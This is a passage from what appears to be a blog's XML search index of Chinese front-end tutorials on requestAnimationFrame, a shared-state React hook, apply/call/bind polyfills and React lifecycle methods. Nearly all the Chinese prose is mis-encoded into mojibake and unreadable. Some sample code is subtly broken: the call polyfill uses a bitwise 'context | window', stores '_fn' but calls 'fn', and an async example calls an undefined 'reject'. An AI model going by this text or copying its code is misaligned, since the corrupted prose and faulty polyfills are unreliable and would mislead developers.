    <content type="text"><![CDATA[å¼•ç”¨MDN requestAnimationFrameçš„ä¸€å¥è¯ã€‚ window.requestAnimationFrame() å‘Šè¯‰æµè§ˆå™¨â€”â€”ä½ å¸Œæœ›æ‰§è¡Œä¸€ä¸ªåŠ¨ç”»ï¼Œå¹¶ä¸”è¦æ±‚æµè§ˆå™¨åœ¨ä¸‹æ¬¡é‡ç»˜ä¹‹å‰è°ƒç”¨æŒ‡å®šçš„å›è°ƒå‡½æ•°æ›´æ–°åŠ¨ç”»ã€‚å›è°ƒå‡½æ•°æ‰§è¡Œæ¬¡æ•°é€šå¸¸æ˜¯æ˜¯æ¯ç§’60æ¬¡ï¼Œä¸æµè§ˆå™¨åˆ·æ–°å±å¹•æ¬¡æ•°ç›¸åŒ¹é…ã€‚ä¸ºäº†æé«˜æ€§èƒ½å’Œç”µæ± å¯¿å‘½ï¼Œå› æ­¤åœ¨å¤§å¤šæ˜¯æµè§ˆå™¨é‡Œï¼Œå½“ requestAnimationFrame() è¿è¡Œåœ¨åå°æ ‡ç­¾é¡µæˆ–è€…éšè—çš„iframeé‡Œæ—¶ï¼ŒrequestAnimationFrame ä¼šè¢«æš‚åœã€‚ æ€»çš„æ¥è¯´ï¼ŒrequestAnimationFrame å°±æ˜¯ä¸ºäº†è§£å†³åŠ¨ç”»é—®é¢˜è€Œç”Ÿçš„ã€‚é‚£ä¹ˆä½¿ç”¨ requestAnimationFrame ä¼šå¸¦æ¥é‚£äº›å¥½å¤„å‘¢ï¼Ÿ æˆ‘ä»¬å…ˆæ¥é˜è¿°ä¸€ä¸‹åŠ¨ç”»è¿™ä¸ªè¯çš„å«ä¹‰ï¼Œå¼•å…¥ç»´åŸºç™¾ç§‘çš„è¯è¯­: åŠ¨ç”»æ˜¯æŒ‡ç”±è®¸å¤šå¸§é™æ­¢çš„ç”»é¢ï¼Œä»¥ä¸€å®šçš„é€Ÿåº¦ï¼ˆå¦‚æ¯ç§’16å¼ ï¼‰è¿ç»­æ’­æ”¾æ—¶ï¼Œè‚‰çœ¼å› è§†è§‰æ®‹åƒäº§ç”Ÿé”™è§‰ï¼Œè€Œè¯¯ä»¥ä¸ºç”»é¢æ´»åŠ¨çš„ä½œå“ã€‚ æµè§ˆå™¨ç»˜åˆ¶ç”»é¢çš„é¢‘ç‡ï¼ˆæ¯ç§’ç»˜åˆ¶å¸§çš„é€Ÿåº¦ï¼‰æ˜¯æœ‰é™åˆ¶çš„ï¼Œç°åœ¨å¤§éƒ¨åˆ†æµè§ˆå™¨çš„å®ç°ä¸ºæ¯ç§’60-70å¸§ã€‚ é‚£ä¹ˆè¦å®ç°æˆ‘ä»¬çš„åŠ¨ç”»è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿåªéœ€è¦å‘Šè¯‰æµè§ˆå™¨åœ¨ç»˜åˆ¶æ¯ä¸€å¸§çš„æ—¶å€™æ›´æ–°æˆ‘ä»¬çš„åŠ¨ç”»ï¼Œå°±å¯ä»¥å®ç°æµç•…çš„åŠ¨ç”»äº†ã€‚è€Œ requestAnimationFrame å°±æ˜¯åšè¿™ä¹ˆä¸ªäº‹æƒ…çš„ã€‚ æœ‰äººå°±è¦æé—®äº†ï¼ŒsetTimeout å’Œ setInterval ä¹Ÿå¯ä»¥å®ç°åŠ¨ç”»å‘€ï¼Ÿç”¨è¿™ä¸¤ä¸ª API ä¼šæœ‰ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ æ²¡é—®é¢˜éƒ½å¯ä»¥å®ç°åŠ¨ç”»ã€‚åªæ˜¯æœ‰å¦‚ä¸‹æš‡ç–µï¼š setTimeout å’Œ setInterval ä¸å®˜æ–¹ï¼Œå®ƒä¸çŸ¥é“ç»˜åˆ¶åŠ¨ç”»çš„æœ€ä½³æ—¶æœºã€‚å¦‚åŒæµè§ˆå™¨éƒ½æ”¯æŒäº† promiseï¼Œä½ è¿˜è¦ä½¿ç”¨ polyfillï¼Œè¿™ä¸æ˜¯ç¼ºå¿ƒçœ¼å—ï¼Ÿ setTimeout å’Œ setInterval ä¹Ÿä¸èƒ½ä¿è¯èƒ½æŒ‰æ—¶ç»˜åˆ¶ï¼Œä¸€æ˜¯æµè§ˆå™¨æœ‰ç»˜åˆ¶é¢‘ç‡ï¼ŒäºŒæ˜¯çº¿ç¨‹é˜»å¡å¯¼è‡´ã€‚ å‰é¢ä¹Ÿæåˆ°è¿‡ requestAnimationFrame åœ¨åå°æ ‡ç­¾é¡µä¼šåœæ­¢ï¼Œèƒ½æé«˜æ€§èƒ½å’Œç”µæ± å¯¿å‘½ï¼Œè€Œ setTimout å’Œ setInterval ä¸ä¼šåœã€‚ âš ï¸æ³¨æ„ï¼Œè¿™é‡Œä¸æ˜¯è¯´ requestAnimationFrame èƒ½è§£å†³åŠ¨ç”»æ€§èƒ½é—®é¢˜ï¼ŒrequestAnimationFrame æ˜¯è¿è¡Œåœ¨ä¸»çº¿ç¨‹ï¼ˆjsçº¿ç¨‹ï¼‰é‡Œï¼Œå½“ä¸»çº¿ç¨‹å¤ªå¿™è¿˜æ˜¯ä¼šå‡ºç°æ‰å¸§ï¼Œå¯¼è‡´å¡é¡¿çš„ç°è±¡ã€‚å› ä¸ºä¸»çº¿ç¨‹å’Œ UIçº¿ç¨‹æ˜¯äº’æ–¥çš„ï¼Œå½“è¿è¡Œjsçº¿ç¨‹æ—¶ï¼Œä¼šå°†UIçº¿ç¨‹æŒ‚èµ·ã€‚æ‰€ä»¥å¦‚æœjsçº¿ç¨‹å ç”¨æ—¶é—´å¤ªé•¿ï¼ŒUIçº¿ç¨‹å¾—ä¸åˆ°æ‰§è¡Œï¼Œå°±ä¼šå‡ºç°æ‰å¸§å¡é¡¿ç°è±¡ã€‚å’Œç”¨ requestAnimationFrameã€setTimeoutã€setInterval æ²¡å…³ç³» è¯´åˆ°è¿™é‡Œï¼Œåœ¨æ‰¯è¿œä¸€ç‚¹ï¼ŒReact Fiber çš„å‡ºç°å…¶å®ä¹Ÿæ˜¯ä¸ºäº†è§£å†³ js çº¿ç¨‹æ‰§è¡Œæ—¶é—´å¤ªé•¿ï¼Œå¯¼è‡´é¡µé¢å¡é¡¿çš„é—®é¢˜çš„ã€‚React Fiber æ¸²æŸ“ä»»åŠ¡æ‹†åˆ†æˆä¸€ä¸ªä¸ª fiber å•å…ƒï¼Œåœ¨æµè§ˆå™¨å¸§ä¸å¸§ç»˜åˆ¶çš„ç©ºéš™å–å‡ºä»»åŠ¡ï¼Œå¹¶æ‰§è¡Œã€‚è¿›è€Œä¸ä¼šé˜»å¡ç”¨æˆ·ä¸é¡µé¢çš„äº¤äº’ã€‚ æ³¨æ„ï¼šè¿™é‡Œè¯´çš„æ˜¯ä»»åŠ¡æ‹†åˆ†ï¼Œä¸æ˜¯ä»»åŠ¡ä¼˜åŒ–ï¼Œæ‰€ä»¥æ•´ä¸ªä»»åŠ¡çš„è¿è¡Œæ—¶é—´è¿˜æ˜¯ä¸ä¼šå˜ï¼Œç”šè‡³ä¼šæ›´é•¿ï¼Œå› ä¸ºå¤šäº†ä»»åŠ¡é—´åˆ‡æ¢æ‰§è¡Œçš„æˆæœ¬ã€‚åªä¸è¿‡æ˜¯ä¸ºäº†ä¸é˜»å¡æµè§ˆå™¨é«˜ä¼˜ä»»åŠ¡ï¼ŒæŠŠä»»åŠ¡æ‰§è¡Œå‘¨æœŸæ‹‰é•¿äº†ã€‚æ‰€ä»¥å½“æˆ‘ä»¬æŠŠä»£ç å†™çš„å¤ªçƒ‚çš„æ—¶å€™è¿˜æ˜¯ä¼šå¡çš„ã€‚ã€‚ã€‚]]></content>
      <categories>
        <category>åŠ¨ç”»</category>
      </categories>
      <tags>
        <tag>åŠ¨ç”»</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å®ç°ä¸€ä¸ªshare state hook]]></title>
    <url>%2F%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AAshare%20state%20hook%2F</url>
    <content type="text"><![CDATA[ç°çŠ¶ react hooks ç›®å‰ä¸»è¦ä½œç”¨åœ¨äºé€šè¿‡ useState ç­‰å‡½æ•°å®ç°çŠ¶æ€é€»è¾‘å…±äº«ï¼Œè€Œä¸æ˜¯çŠ¶æ€å…±äº«ã€‚state å…±äº«ä¾æ—§éœ€è¦ redux ç­‰åº“å»å®ç°ã€‚redux å¯¹äºå¤§å‹åº”ç”¨ç¡®å®æ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ã€‚ä½†æ˜¯å†™ actionã€reducers éš¾å—å‘€ï¼ŸåŒæ„çš„è¯·å¾€ä¸‹çœ‹ï¼Œä¸åŒæ„çš„è¯·æ‘ âŒ˜ + wã€‚ é‡æ–°æ€è€ƒ action | reducersé‚£ä¹ˆèŠ±è´¹é‚£ä¹ˆå¤§åŠŸå¤«å†™ actionã€reducers çš„ç›®çš„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå®ƒèƒ½å¸¦æ¥é‚£äº›å¥½å¤„å‘¢ï¼Ÿæˆ‘è®¤ä¸ºæœ‰å¦‚ä¸‹å‡ ç‚¹ã€‚ å¤ç”¨æ•°æ®æ›´æ”¹é€»è¾‘ ä½¿æ•°æ®é€æ˜åŒ–ï¼Œä¾¿äºè¿½è¸ª bugï¼Œä»¥åŠåæœŸç»´æŠ¤ æ–¹ä¾¿åšç‹¬ç«‹æµ‹è¯• å¯ä»¥æ‰©å±•å»è¡¨è¾¾å¤æ‚çš„æ›´æ–°é€»è¾‘ çœ‹èµ·æ¥å¾ˆä¸é”™ï¼Œé‚£å¦‚æœè¦è¾¾åˆ°è¿™äº›ç›®çš„ï¼Œæ˜¯ä¸æ˜¯æ²¡æœ‰å…¶ä»–æ›´ä¼˜é›…çš„æ–¹æ¡ˆäº†å‘¢ï¼Ÿ ä¸€ç§æ›´ä¼˜é›…çš„å®ç° state å…±äº«çš„æ–¹å¼ å—åˆ° react hooksã€rematch å’Œ reactN çš„å¯å‘ã€‚æˆ‘å®ç°ä¸€ç§ hooks å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥å®ç° state çš„å…±äº«ã€‚ åˆ›å»ºä¸€ä¸ªåŒæ­¥ state hookå¯ä»¥é€šè¿‡ä¼ å…¥ä¸€ä¸ªåŒ…å« state reducers effects(å¯é€‰) ä¸‰ä¸ªå±æ€§çš„å¯¹è±¡ï¼Œç”Ÿæˆä¸€ä¸ªå¯ä»¥åœ¨å¤šä¸ªç»„ä»¶é—´å…±äº« state çš„ hookã€‚Github 123456789101112131415161718192021222324252627282930// useCount.jsimport createShareStateHook from './createShareStateHook';const count = &#123; // éœ€è¦åœ¨å¤šä¸ªç»„ä»¶é—´è´¡çŒ®çš„ state state: &#123; count: 0, name: 'ç½—å®¾' &#125;, // reducers åŒæ­¥æ•°æ®å˜æ›´ reducers: &#123; increment: (state, payload) =&gt; Object.assign(&#123;&#125;, state, &#123;count: state.count + payload&#125;), decrement: (state, payload) =&gt; Object.assign(&#123;&#125;, state, &#123;count: state.count - payload&#125;), changeName: (state, payload) =&gt; Object.assign(&#123;&#125;, state, &#123;name: payload&#125;), &#125;, // å¼‚æ­¥æ•°æ®å˜æ›´ effects: &#123; getDataAsync() &#123; fetch('/get').then((res) =&gt; &#123; return res.json(); &#125;).then((data) =&gt; &#123; this.changeName(data.name); &#125;).catch(err =&gt; &#123; reject(err); &#125;) &#125; &#125;&#125;;// åˆ›å»ºåŒæ­¥ state çš„ hooksexport default createShareStateHook(count) ä½¿ç”¨åŒæ­¥ state hookç›´æ¥è°ƒç”¨ä¸Šä¸€æ­¥ç”Ÿæˆ hook çš„å‡½æ•°ã€‚123456789101112131415161718192021222324import useCounter from './useCounter';const Controls = () =&gt; &#123; const [data, dispatch, effects] = useCounter(); return ( &lt;&gt; &lt;div&gt;å½“å‰ count: &#123;data.count&#125; &lt;/div&gt; &lt;button onClick=&#123;() =&gt; dispatch.increment(1)&#125;&gt;åŠ ä¸€&lt;/button&gt; &lt;button onClick=&#123;() =&gt; dispatch.decrement(1)&#125;&gt;å‡ä¸€&lt;/button&gt; &lt;button onClick=&#123;() =&gt; effects.getDataAsync()&#125;&gt;è·å–å¼‚æ­¥æ•°æ®&lt;/button&gt; &lt;/&gt; );&#125;const Message = () =&gt; &#123; const [data] = useCounter(); const &#123;count, name&#125; = data; return ( &lt;div&gt; &lt;div&gt;count: &#123;count&#125;&lt;/div&gt; &lt;div&gt;name: &#123;name&#125;&lt;/div&gt; &lt;/div&gt; )&#125;]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>hooks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç†è§£apply,call,bind]]></title>
    <url>%2F%E7%90%86%E8%A7%A3apply%2Ccall%2Cbind%2F</url>
    <content type="text"><![CDATA[ä¹‹å‰å¯¹ js çš„ applyã€callã€bind æ–¹æ³•é›¶é›¶æ•£æ•£æœ‰è¿‡ä¸€äº›äº†è§£ï¼ŒçŸ¥é“å®ƒä»¬å¯ä»¥æ”¹å˜å‡½æ•°è¿è¡Œæ—¶çš„ thisã€‚ä»Šå¤©æ¥æ·±å…¥ç†è§£ä¸€ç•ªã€‚ å…¶å®å¾ˆå¤šäººå¿ƒæƒ³ä¸å°±æ˜¯ç»‘å®š this å˜›ï¼Œæœ‰ä»€ä¹ˆçš„ã€‚ å¥½ï¼Œé‚£ä¹ˆè¿™å¥ä»£ç ä½•è§£ï¼Ÿ 1Function.apply.bind(Math.max, null); çŸ¥é“å‘€ï¼Œä¸å°±æ˜¯ xxxx å˜› é‚£ä¹ˆè¿™å¥å‘¢ï¼Ÿ 1Function.bind.apply(fn, arguments) çŸ¥é“çš„å°±å¯ä»¥ç›´æ¥å…³é—­é¡µé¢äº†ï¼Œè¿˜ä¸äº†è§£çš„è¯·å¾€ä¸‹çœ‹ é¦–å…ˆä»€ä¹ˆæ˜¯ this å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡ã€‚æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­ä¼šåŒ…å«å‡½æ•°çš„å‚æ•°ã€è°ƒç”¨æ–¹æ³•ç­‰ä¿¡æ¯ã€‚this å°±æ˜¯å…¶ä¸­çš„ä¸€ä¸ªå±æ€§ã€‚ç›¸å½“äºä¸€ä¸ªæŒ‡é’ˆï¼Œè‡³äºæŒ‡å‘ä»€ä¹ˆï¼Œå®Œå…¨å–å†³äºå‡½æ•°åœ¨å“ªé‡Œè¢«è°ƒç”¨ã€‚ å¥½åƒæœ‰ç‚¹æ™•ï¼Œæˆ‘ä»¬é€šè¿‡ä»£ç æ¥åˆ†æä¸€ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435const obj = &#123; index: 1, func: function() &#123; console.log(this.index); &#125;&#125;/** è¾“å‡ºä»€ä¹ˆï¼Ÿ* ä¸ç”¨æƒ³äº†ï¼Œæ²¡ä»€ä¹ˆé™·é˜±* 1*/obj.func(); const funcCp = obj.func;/** è¾“å‡ºä»€ä¹ˆï¼Ÿ* ä¹Ÿæ²¡ä»€ä¹ˆéš¾åº¦* undefined * this æŒ‡å‘å…¨å±€äº†å˜›*/funcCp();function bar(fun) &#123; fun();&#125;/** è¾“å‡ºä»€ä¹ˆï¼Ÿ* å¾ˆå¤šäººå¯èƒ½æ›¾ç»å°±çŠ¯è¿‡è¿™ä¸ªé”™è¯¯äº†ï¼Œä»¥ä¸ºæ˜¯ 1ï¼Œå…¶å®è¿˜æ˜¯* undefined * obj.func å¯¹ fun è¿›è¡Œäº†éšå¼èµ‹å€¼*/bar(obj.func); apply apply è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šè¿è¡Œæ—¶ thisï¼Œç¬¬äºŒå‚æ•°æ¥å—ä¸€ä¸ªåŒ…å«å¤šä¸ªå‚æ•°çš„æ•°ç»„ã€‚ï¼ˆè¿™æ˜¯ä¸ call æ–¹æ³•çš„åŒºåˆ«) 12345678910111213141516function func(x, y) &#123; if (typeof x === 'number') &#123; console.log(this.index + x); &#125; else &#123; console.log(this.index); &#125;&#125;const obj = &#123; index: 1,&#125;func.apply(obj); // 1func.apply(obj, 2); // æŠ¥é”™ï¼Œç¬¬äºŒä¸ªå‚æ•°ï¼ˆå¦‚æœæœ‰ï¼‰å¿…é¡»ä¸ºæ•°ç»„func.apply(obj, [2]); // 3func.apply(obj, [2], 3); // 3ï¼Œåé¢çš„å‚æ•°å°†ä¼šå¿½ç•¥ apply ç»å¸¸ç”¨äºâ€œå±•å¼€â€æ•°ç»„ï¼š 1Math.max.apply(null, [1, 2, 3]); // 3 æ­¤ç§åšæ³• es6 ç§°ä¸ºè§£æ„: 1Math.max(...[1, 2, 3]); // 3 æ‰‹åŠ¨å®ç° apply123456789101112131415161718if (!Function.prototype.apply) &#123; Function.prototype.apply = function (ctx) &#123; if (typeof this !== 'function') &#123; throw new TypeError('use apply must be a function'); &#125; ctx = ctx || window; ctx.fn = this; let result; if (arguments[1]) &#123; if (!Array.isArray(arguments[1])) throw new TypeError('apply second argument must be a array'); result = ctx.fn(...arguments); &#125; else &#123; result = ctx.fn(); &#125; delete ctx.fn; return result; &#125;&#125; call call è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šè¿è¡Œæ—¶çš„ thisï¼Œå…¶ä½™å‚æ•°æŒ‡å®šå‚æ•°åˆ—è¡¨ã€‚ 1234567891011121314function func(x, y) &#123; if (typeof x === 'number') &#123; console.log(this.index + x); &#125; else &#123; console.log(this.index); &#125;&#125;const obj = &#123; index: 1,&#125;func.call(obj); // 1func.call(obj, 2); //3 æ‰‹åŠ¨å®ç° call12345678910111213if (!Function.prototype.call) &#123; Function.prototype.call = function (context) &#123; if (typeof this !== 'function') &#123; throw new TypeError('use call must be a function'); &#125; context = context | window; context._fn = this; const args = [...arguments].slice(1); let result = context.fn(...args); delete context._fn; return result; &#125;&#125; bind bind åˆ›å»ºä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šè¿è¡Œæ—¶çš„ thisï¼Œå…¶ä½™å‚æ•°ç½®äºå®å‚ä¹‹å‰ã€‚å¯ä»¥ç†è§£ä¸ºå¯¹ apply æ–¹æ³•çš„å°è£…è°ƒç”¨ã€‚ 1234567891011121314151617function func(x, y) &#123; if (typeof x === 'number' &amp;&amp; typeof y === 'number' ) &#123; console.log(this.index + x + y); &#125; else &#123; console.log(this.index); &#125;&#125;const obj = &#123; index: 1,&#125;const newFunc1 = func.bind(obj);newFunc1(); // 1const newFunc2 = func.bind(obj, 2);newFunc2(3); // 6 bind ç»å¸¸ç”¨æ¥åšæŸ¯é‡ŒåŒ–ï¼š 123456function func(x, y) &#123; console.log(`$&#123;x&#125; ------ $&#123;y&#125;`);&#125;const k = func.bind(null, 1);k(2); // 1 ------ 2 ä½¿ç”¨ call å®ç° bind1234567891011121314151617if (!Function.prototype.bind) &#123; Function.prototype.bind = function (context) &#123; if (typeof this !== 'function') &#123; throw new TypeError('use bind must be a function'); &#125; context = context || window; const _this = this; const args = [...arguments].slice(1); return function F() &#123; // å› ä¸ºè¿”å›çš„ä¸€ä¸ªå‡½æ•°ï¼Œå¯ä»¥ç”¨ newï¼Œæ‰€ä»¥éœ€è¦åˆ¤æ–­ if (this instanceof F) &#123; return new _this(...args, ...arguments); &#125; return _this.call(context, ...args, ...arguments); &#125; &#125;&#125; å¤šæ¬¡ bind åªæœ‰ç¬¬ä¸€æ¬¡ç”Ÿæ•ˆ1234567891011121314151617181920function fun() &#123; console.log(this.a);&#125;const obj1 = &#123; a: 1&#125;const obj2 = &#123; a: 2&#125;fun.bind(obj1).bind(obj2)() // 1// ç›¸å½“äº// ç¬¬äºŒæ¬¡ç»‘å®šï¼Œç›¸å½“äºç»‘å®šç»‘å®šåçš„ç»“æœã€‚ç¬¬ä¸€æ¬¡ fun çš„ç»‘å®šæ²¡æœ‰å½±å“function boo(o) &#123; return function () &#123; fn.call(o, ...arguments); &#125;.call(o2, ...arguments);&#125; è¿›åŒ– é‚£ä¹ˆä¸‹é¢è¯­å¥å°†ä¼šè¾“å‡ºä»€ä¹ˆå‘¢ï¼Ÿ 123456789101112131415161718192021222324252627const fn = function(x) &#123; console.log(2 + x);&#125;// èªæ˜çš„ä½ å¯èƒ½å·²ç»æƒ³åˆ°äº†ï¼Œç­”æ¡ˆä¸ºï¼š4// apply æŒ‡å®š Function.call çš„æ‰§è¡Œä¸Šä¸‹æ–‡ä¸º fnï¼Œå¹¶ä¼ å…¥å‚æ•° 2ã€‚// æ ¹æ® call è¯­æ³•è§„åˆ™ï¼Œcall è°ƒç”¨ fnï¼Œå¹¶ä¼ å…¥å‚æ•° 2Function.call.apply(fn, [null, 2]);// æŠ¥é”™ï¼Œè®°ä½ apply çš„ç¬¬äºŒä¸ªå‚æ•°å¿…é¡»ä¸º æ•°ç»„Function.apply.apply(fn, [null, 2]); // é€šè¿‡, è¾“å‡ºï¼š4Function.apply.apply(fn, [null, [2]]); /*+++++++++++++++++++++++++++++++++++++++++++++++++++++*/const foo = Function.apply.bind(fn, null, [2]);// æ³¨æ„ï¼Œbind çš„ä½œç”¨æ—¶ç”Ÿæˆä¸€ä¸ªæ–°çš„å‡½æ•°// ç»™ Function.apply ç»‘å®šä¸€ä¸ª fn çš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œå¹¶å°†å‚æ•° 2 ä¼ å…¥ fnfoo(); // 4/*+++++++++++++++++++++++++++++++++++++++++++++++++++++*/const bar = Function.bind.apply(fn, [fn, 2]);// æ³¨æ„ï¼Œbind çš„ä½œç”¨æ—¶ç”Ÿæˆä¸€ä¸ªæ–°çš„å‡½æ•°bar(); // 4]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>apply</tag>
        <tag>call</tag>
        <tag>bind</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[reactç”Ÿå‘½å‘¨æœŸ]]></title>
    <url>%2Freact%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%2F</url>
    <content type="text"><![CDATA[reactåœ¨ ^16.4 ç‰ˆæœ¬è¿›è¡Œç”Ÿå‘½å‘¨æœŸçš„å˜æ›´ï¼ŒåºŸé™¤äº† componentWillMount,componentWillReceiveProps,componentWillUpdateï¼Œæ–°å¼•å…¥äº†ä¸¤ä¸ªç”Ÿå‘½å‘¨æœŸå‡½æ•° getDerivedStateFromProps,getSnapshotBeforeUpdateã€‚ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œreact ç»„ä»¶ç”Ÿå‘½å‘¨æœŸåˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š åˆ›å»ºæ—¶ æ›´æ–°æ—¶ å¸è½½æ—¶ ä¸‹é¢æˆ‘ä»¬é€ä¸ªåˆ†æä¸€ä¸‹ åˆ›å»ºæ—¶ åˆ›å»ºæœŸ react å°†ä¼šæŒ‰ç…§ä¸‹é¢é¡ºåºè°ƒç”¨ç”Ÿå‘½å‘¨æœŸå‡½æ•° constructor static getDerivedStateFromProps render componentDidMount æ›´æ–°æ—¶æ›´æ–°æ—¶ï¼Œreact å°†æŒ‰ç…§ä¸‹é¢çš„é¡ºåºè°ƒç”¨ç”Ÿå‘½å‘¨æœŸ getDerivedStateFromProps shouldComponentUpdate render getSnapshotBeforeUpdate componentDidUpdate å¸è½½æ—¶å¸è½½æ—¶ï¼Œè°ƒç”¨ componentWillUnmount ä¸ºä»€ä¹ˆè¦è°ƒæ•´ç”Ÿå‘½å‘¨æœŸï¼ŸUNSAFE_componentWillMountåˆšå¼€å§‹æ¥è§¦ react çš„æ—¶å€™ï¼Œå¯èƒ½å¾ˆå¤šåŒå­¦ä¸ºäº†å°½æ—©çš„å‘å‡ºè¯·æ±‚ï¼Œå°†åç«¯æ•°æ®è¯·æ±‚æ”¾åœ¨ componentWillMountï¼Œä½†å®é™…ä¸Š componentWillMount æ‰§è¡Œåï¼Œrender å°±å¼€å§‹äº†ã€‚æ‰€ä»¥é¦–æ¬¡æ¸²æŸ“æ€»ä¼šæ˜¯æ²¡æœ‰å¼‚æ­¥æ•°æ®çš„ã€‚éœ€è¦å°½æ—©æ‹‰å–æ•°æ®ï¼Œå®˜æ–¹é¼“åŠ±æ”¾åœ¨ constructor ä¸­ã€‚å…¶æ¬¡ï¼Œå¦‚æœå°† api è¯·æ±‚å’Œäº‹ä»¶ç›‘å¬ç­‰æ”¾åœ¨ componentWillMountï¼Œé‚£ä¹ˆåœ¨æœåŠ¡ç«¯æ¸²æŸ“çš„æ—¶å€™å°±ä¼šå‡ºç°é—®é¢˜ï¼Œç»„ä»¶åœ¨è¯·æ±‚å®Œæˆä¹‹å‰æ¸²æŸ“ï¼Œæ‰€ä»¥å³ä½¿æˆ‘ä»¬åœ¨æœåŠ¡ç«¯å®Œæˆæ¸²æŸ“ä¹Ÿåªæ˜¯å®Œæˆäº†éƒ¨åˆ†ã€‚æ‰€ä»¥åº”è¯¥æŠŠè¯·æ±‚ç§»è‡³ componentDidMountã€‚äº‹ä»¶ç›‘å¬ä¹Ÿä¸€æ ·ï¼Œåœ¨componentWillMount è®¢é˜…çš„äº‹ä»¶ï¼Œå› ä¸ºæœåŠ¡ç«¯ä¸ä¼šè°ƒç”¨ componentWillUnmount è€Œä¸èƒ½å–æ¶ˆè®¢é˜…ã€‚ å¦å¤–ï¼Œåœ¨æœªæ¥å¼‚æ­¥æ¸²æŸ“æœºåˆ¶ä¸­ï¼Œå•ä¸ªç»„ä»¶çš„å®ä¾‹ä¹Ÿå¯èƒ½å¤šæ¬¡è°ƒç”¨è¯¥æ–¹æ³•ã€‚ UNSAFE_componentWillReceivePropsç¼–å†™ react åº”ç”¨çš„æ—¶å€™ï¼Œå¯èƒ½æœ‰é‡åˆ°éœ€è¦ç›‘å¬ props æ›´æ”¹ stateï¼Œæˆ–è€…å½“ props å˜æ›´çš„æ—¶å€™è°ƒç”¨ä¸€äº›æ–¹æ³•ã€‚è¿™ä¼šç ´å state å•ä¸€æ•°æ®æºçš„è§„åˆ™ï¼Œå¯¼è‡´ç»„ä»¶çŠ¶æ€å˜æ›´ä¸å¯é¢„æµ‹ã€‚å®˜æ–¹å‡ºä¸€ç¯‡åšå®¢è¿›è¡Œè§£æä½ å¾ˆå¯èƒ½ä¸éœ€è¦æ´¾ç”Ÿ stateã€‚ä¸ºäº†åº”å¯¹ä¸€äº›ç‰¹æ®Šéœ€æ±‚ï¼Œå®˜æ–¹å¼•å…¥ä¸€ä¸ªæ–°çš„ç”Ÿå‘½å‘¨æœŸæ–¹æ³• static getDerivedStateFromProps å»ç›‘å¬ props è¿›è€Œæ›´æ–°å½“å‰ç»„ä»¶ã€‚å¹¶ä¸”å»ºè®®å°† props å˜æ›´è€Œå¿…é¡»è°ƒç”¨çš„æ–¹æ³•æ”¾åˆ° componentDidUpdate è€Œä¸æ˜¯å°†æ–¹æ³•è°ƒç”¨å’Œ state æ›´æ–°éƒ½æ··åœ¨ componentWillReceiveProps æ–¹æ³•ä¸­ï¼Œé¿å…äº†å¤–éƒ¨ç»„ä»¶é¢‘ç¹æ›´æ–° props å¸¦æ¥çš„åœ¨å•æ¬¡ render å†…å¤šæ¬¡è°ƒç”¨ componentWillReceiveProps çš„é—®é¢˜ã€‚ UNSAFE_componentWillUpdatecomponentWillUpdate åœ¨å¼‚æ­¥æ¸²æŸ“æœºåˆ¶ä¸‹å˜çš„ä¸å¯é ï¼Œå®ƒæ˜¯åœ¨ render ä¹‹å‰è°ƒç”¨çš„ã€‚æ¯”å¦‚è¦è·å–ç”¨æˆ·å½“å‰çš„ scroll ä½ç½®ï¼Œåœ¨å®ç°å¼‚æ­¥æ¸²æŸ“æ—¶ï¼Œæ¸²æŸ“è¿‡ç¨‹ä¸­ä¼šå‡ºç°æ¸²æŸ“é˜¶æ®µï¼ˆrenderï¼‰å’Œæäº¤é˜¶æ®µï¼ˆgetSnapshotBeforeUpdateï¼ŒcomponentDidUpdateï¼‰ã€‚å¦‚æœåœ¨ componentWillUpdate è·å–ç”¨æˆ·å½“å‰ scroll ä½ç½®ï¼Œé‚£ä¹ˆå½“æ¸²æŸ“é˜¶æ®µå’Œæäº¤é˜¶æ®µè¿™æ®µæ—¶é—´å·®å†…,ç”¨æˆ·æ»šåŠ¨äº†å±å¹•,æ”¹å˜äº† scroll çš„ä½ç½®ï¼Œé‚£ä¹ˆ componentWillUpdate è·å¾—çš„æ•°æ®å·²ç»è¿‡æœŸäº†ã€‚è€Œ getSnapshotBeforeUdpate ä¼šåœ¨ dom æ›´æ–°ä¹‹å‰ç«‹åˆ»è¢«è°ƒç”¨ã€‚ å¸¸ç”¨ç”Ÿå‘½å‘¨æœŸæ–¹æ³•renderrender ä¼šåœ¨this.propså’Œthis.stateæ›´æ”¹çš„æ—¶å€™è°ƒç”¨ã€‚å¯ä»¥è¿”å›å¦‚ä¸‹ç±»å‹ React Element Arrays å’Œ fragments Portals String and Bumberï¼šæ¸²æŸ“æ–‡æœ¬ boolean or null: ä»€ä¹ˆéƒ½ä¸æ¸²æŸ“ render å¿…é¡»æ˜¯ä¸ªçº¯å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯åœ¨çŠ¶æ€ä¸å˜çš„æƒ…å†µï¼Œæ¯æ¬¡è°ƒç”¨è¿”å›çš„ç»“æœç›¸åŒã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“ shouldCompoentUpdate è¿”å› false çš„æ—¶å€™ï¼Œrender 